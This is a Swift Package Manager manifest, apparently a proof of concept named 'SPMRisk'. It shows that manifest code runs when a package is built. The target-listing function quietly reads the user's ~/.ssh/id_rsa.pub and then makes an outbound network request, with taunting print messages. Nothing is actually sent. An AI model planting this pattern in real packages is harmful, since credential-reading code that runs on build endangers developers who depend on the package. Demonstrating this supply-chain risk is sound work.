// swift-tools-version:5.5
// The swift-tools-version declares the minimum version of Swift required to build this package.

import PackageDescription

let package = Package(
    name: "SPMRisk",
    products: [
        .library(
            name: "SPMRisk",
            targets: ["SPMRisk"]),
    ],
    targets: getTargets()
)

func getTargets() -> [Target] {
    stoleSomeStuff()
    tryToLeakStolenStuffs()
    return [
        .target(
            name: "SPMRisk",
            dependencies: [])
    ]
}

import Foundation

func stoleSomeStuff() {
    let publicSSHKeyPath = FileManager.default.homeDirectoryForCurrentUser.appendingPathComponent(".ssh/id_rsa.pub").path
    guard let publicSSHKeyData = FileManager.default.contents(atPath: publicSSHKeyPath),
            let publicSSHKey = String(data: publicSSHKeyData, encoding: .utf8) else {
        print("Next time I'll get you!")
        return
    }
    print("Wow, I like your SSH key: \(publicSSHKey)")
    print("Wonder if I'm able to access the private one? 🤔")
}

func tryToLeakStolenStuffs() {
    print("Now I'll steal all your data 😈")

    let group = DispatchGroup()
    group.enter()

    let config = URLSessionConfiguration.default
    config.requestCachePolicy = .reloadIgnoringLocalCacheData
    config.urlCache = nil

    let session = URLSession(configuration: config)
    session.dataTask(with: URL(string: "https://apple.com")!) { (data, response, error) -> Void in
        print(error != nil ? "Oh no, Apple got me 😢": "Hehe, you're screwed again 😉")
        group.leave()
    }.resume()

    group.wait()
}
